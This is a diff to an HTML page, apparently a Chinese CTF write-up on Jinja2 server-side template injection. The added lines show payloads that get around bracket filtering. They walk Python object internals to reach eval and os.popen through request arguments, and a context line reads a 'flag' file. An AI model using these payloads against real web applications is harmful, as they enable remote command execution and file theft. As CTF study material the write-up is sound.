@@ -168,6 +168,12 @@
 <p>拼凑得：</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read() &#125;&#125;&amp;x1=flag</span><br></pre></td></tr></table></figure>
 
+<p>而实际上，我发现中括号也是可以进行替代的</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[request.args.x1](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;)    &#125;&#125;&amp;x1=eval</span><br></pre></td></tr></table></figure>
+
+<p>拼凑得出：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.__class__.__init__.__globals__[request.args.x1].popen(request.args.x2).read() &#125;&#125;&amp;x1=os&amp;x2=dir</span><br></pre></td></tr></table></figure>
+
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
